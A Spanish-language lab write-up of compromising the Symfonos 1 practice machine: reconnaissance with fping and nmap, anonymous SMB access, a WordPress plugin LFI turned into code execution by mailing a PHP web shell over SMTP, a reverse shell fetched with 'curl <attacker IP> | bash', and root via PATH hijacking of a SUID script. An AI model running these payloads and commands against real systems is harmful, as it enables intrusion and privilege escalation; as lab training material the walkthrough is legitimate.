![[Pentesting/Writeups/Images/Symfonos1/1.png]]

## Fase de Reconocimiento

Descubrimos el host con la herramienta fping y veo que tengo conectividad con la máquina. También descubro que el TTL es 64 por lo que se trata de una máquina Linux.

![[Pentesting/Writeups/Images/Symfonos1/2.png]]

`fping -a -g 192.168.51.0/24 2>/dev/null`

-a > Para mostrar únicamente las IP que están activas en la red
-g > Para especificar que vamos a hacer el ping a un rango de IP
2>/dev/null > Para enviar todas los mensajes que no nos interesan a un contenedor

Ahora descubrimos los puertos con nmap. Para ello hacemos lo siguiente:

![[Pentesting/Writeups/Images/Symfonos1/3.png]]

`nmap -p- -sS --min-rate 5000 -vvv -n -Pn 192.168.51.185`

-p- > Para indicar que va a hacer un escaneo al rango total de puertos que son 65535 puertos
--open > Para indicar que muestre solo los abiertos
-sS > Para indicar que haga un escaneo SYN bastante ágil y preciso, para evitar falsos positivos
--min-rate 5000 > Para tramitar paquetes no más lentos que 5000 paquetes por segundo
-vvv > Para que a medida que vaya encontrando cosas, las vaya reportando
-n  > Para que el escaneo no haga resolución DNS y sea más rápido
-Pn > Para que tampoco haga resolución a través del protocolo ARP y no realentice el escaneo
-oN > Para guardar el reporte en un formato Normal.

| Puerto  | Servicio |
| ------- | -------- |
| 22/tcp  | SSH      |
| 25/tcp  | SMTP     |
| 80/tcp  | HTTP     |
| 139/tcp | SMB      |
| 445/tcp | SMB      |

Utilizo esta línea de comando para que me saque todos los puertos reportados por nmap en un formato limpio y útil.

![[Pentesting/Writeups/Images/Symfonos1/4.png]]

Ahora vamos a lanzar unos scripts básicos de reconocimiento de nmap para averiguar la versión, Sistema Operativo y si tienen vulnerabilidades los servicios:

`nmap -p139,22,25,445,80 -sS -sV -O 192.168.51.185 -oN Target.txt`

-sV > Para averiguar la versión de cada servicio
-O > Para averiguar el Sistema Operativo que corre.

![[Pentesting/Writeups/Images/Symfonos1/5.png]]

## Fase de Explotación

Vemos que hay una imagen por el puerto 80. Se podría intentar hacer esteganografía pero no va por ahí la máquina. También podemos intentar hacer Fuzzing Web pero no va por ahí tampoco.

![[Pentesting/Writeups/Images/Symfonos1/6.png]]

### Samba | Puerto 139

Listamos recursos compartidos con la herramienta smbmap y vemos que solo tenemos acceso de lectura al recurso anonymous por lo que podemos crear una Null session sin clave.

`smbmap -H 192.168.51.185`

![[Pentesting/Writeups/Images/Symfonos1/7.png]]

Para ello podemos utilizar tanto smbmap como smbclient. Vemos que hay un attention.txt por lo que nos los traemos a nuestra máquina local.

`smblient //192.168.51.185/anonynous -N` 
`dir`
`get attention.txt`

![[Pentesting/Writeups/Images/Symfonos1/8.png]]

Muestra lo siguiente:

![[Pentesting/Writeups/Images/Symfonos1/9.png]]

Nos guardamos las contraseñas para un futuro.

Como habíamos visto antes, había otro recurso compartido que era /helios, por lo que es un usuario. Entonces vamos a intentar probar con estas claves. Para ello utilizamos smbclient.

`smclient //192.168.51.185/helios -U helios
`Enter`
`qwerty`

![[Pentesting/Writeups/Images/Symfonos1/10.png]]

Conseguimos entrar y vemos que hay dos archivos. Para traernos todos los archivos de una y que no nos pregunte por cada uno si queremos descargarlos escribimos el comando `prompt`. Entonces cuando hagamos un `mget *` se pasará todo automáticamente.

![[Pentesting/Writeups/Images/Symfonos1/11.png]]

Vemos lo que contiene cada fichero. En el research.txt no hay nada relevante, pero en el todo.txt hay un directorio de trabajo /h3l105 . Lo que parece una ruta.

![[Pentesting/Writeups/Images/Symfonos1/12.png]]

### Wordpress

Lo probamos en el puerto 80 y efectivamente existe.

![[Pentesting/Writeups/Images/Symfonos1/13.png]]

Vemos que no resuelve pero mirando el código fuente de la página vemos un dominio, así que lo añadimos al /etc/hosts.
**symfonos.local**

![[Pentesting/Writeups/Images/Symfonos1/14.png]]

Ahora vemos que resuelve y vemos que efectivamente es un WordPress. Así que lo primero que se hace siempre es  buscar el /wp-admin. Lo busco y me sale el Login. Entonces intento con el usuario admin y existe por el mensaje de error que sale.

![[Pentesting/Writeups/Images/Symfonos1/15.png]]

En este punto se puede intentar hacer un ataque de fuerza bruta con wpscan, que no va por ahí, o buscar vulnerabilidades, por ejemplo de plugins. Entonces usamos la herramienta wpscan.

`wpscan --url http://symfonos.local/h3l105/ -e u,p`

--url > Para indicar la ruta
-e u,p > Para enumerar usuarios y plugins

Y enumeramos estas cosas

![[Pentesting/Writeups/Images/Symfonos1/16.png]]

### LFI to RCE

En este punto podemos utilizar Metasploit o buscar por Internet, en mi caso utilizaré searchsploit.

`searchsploit mail masta wordpress`

![[Pentesting/Writeups/Images/Symfonos1/17.png]]

Vemos que podemos hacer un LFI, así que vamos a probar a traernos el exploit y ver cómo funciona.

`searchsploit -m 40290`

![[Pentesting/Writeups/Images/Symfonos1/18.png]]

Vemos que puede mirar el /etc/passwd con esta ruta, así que vamos a probar.

![[Pentesting/Writeups/Images/Symfonos1/19.png]]

Y efectivamente podemos verlo.

![[Pentesting/Writeups/Images/Symfonos1/20.png]]

Para convertir el LFI en un RCE tenemos en esta máquina abusar del servicio SMTP / 25.

Tras investigar en esta página [Send-Email](https://www.shellhacks.com/send-email-smtp-server-command-line/) vemos que podemos enviar un email, entonces podemos intentar enviar una el comando típico de PHP para habilitar un CMD `<?php system($_GET['cmd']) ?>` y luego tras buscar la ruta exacta intentar ejecutar comandos.

Hacemos lo siguiente.

`nc 192.168.51.185 25`
`MAIL FROM: alv-fh@test.com`
`RCPT TO: helios` (Porque es un usuario que sabemos que existe)
`DATA`
`Enter`
`<?php system($_GET['cmd']) ?>`
`.`

![[Pentesting/Writeups/Images/Symfonos1/21.png]]

Ahora tenemos que buscar la ruta en donde se envian esos email en el sistema en Linux. 
/var/mail/helios&cmd=id

![[Pentesting/Writeups/Images/Symfonos1/22.png]]

Ahora podemos crear una revshell aunque también se puede desde el navegador directamente pero puede ser más lioso. Lo más sencillos es hacer lo siguiente:

1.- Desde revshell ponemos la IP atacante y el puerto, y copiamos el comando de abajo.

![[Pentesting/Writeups/Images/Symfonos1/23.png]]

2.- Lo pegamos en un index.html.

![[Pentesting/Writeups/Images/Symfonos1/24.png]]

3.- Creamos un Servidor en Python en el mismo directorio que el index.html.

`python3 -m http.server 80`

4.- Nos ponemos en escucha a través del puerto escogido.

`nc -nlvp 443`

5.- En el navegador ponemos el comando curl:

`curl 192.168.51.179 | bash`

![[Pentesting/Writeups/Images/Symfonos1/25.png]]

Y le damos a Enter, si se queda cargando es buena señal.

![[Pentesting/Writeups/Images/Symfonos1/26.png]]

Sanitizamos la shell.

`script /dev/null -c bash`
`Ctrl + z`
`stty raw -echo; fg`
`reset xterm`
`export SHELL=bash`
`export TERM=xterm`

## Escalada de Privilegios

Y buscamos binarios que tengan permisos 4000, SUID. Vemos que hay un script raro /opt/statuscheck.

![[Pentesting/Writeups/Images/Symfonos1/27.png]]

Lo ejecutamos y a simple vista parece una petición al localhost.

![[Pentesting/Writeups/Images/Symfonos1/28.png]]

Lo listamos y efectivamente se ejecuta como root.

![[Pentesting/Writeups/Images/Symfonos1/30.png]]

Podemos ver los strings del script para encontrar algo y vemos que se ejecuta el comando curl.

`strings /opt/statuscheck`

![[Pentesting/Writeups/Images/Symfonos1/29.png]]

### Path Hijacking

Cuando nos encontramos en esta situación  podemos realizar un Path Hijacking. Los pasos a seguir son los siguientes:

1.- Cambiarnos al directorio /tmp ya que tenemos normalmente permisos de escritura.

2.- Creamos el comando curl con `nano curl` y le metemos una bash.

![[Pentesting/Writeups/Images/Symfonos1/31.png]]

-p > Inicia una bash en modo privilegiados.

3.- Le damos permisos 777.

`chmod 777 curl`

4.- Modificar el PATH poniendo un . delante o el directorio /tmp para que cuando lea el script /opt/statuscheck el PATH, a lo primero que se vaya sea al directorio de /tmp, por lo que busca ahí el comando curl, y como tenemos el comando curl pero con una bash, pues inicia automaticamente una bash como root.

`export PATH=.:$PATH`

Vemos que hay un . delante del delimitador que es :  Como se lee de izquierda a derecha, lo primero que va a leer es el . (Nuestro directorio actual de trabajo).

![[Pentesting/Writeups/Images/Symfonos1/32.png]]

5.- Ejecutar de nuevo el script /opt/statuscheck

![[Pentesting/Writeups/Images/Symfonos1/33.png]]

Conseguimos ser root y encontramos la Flag.

![[Pentesting/Writeups/Images/Symfonos1/34.png]]
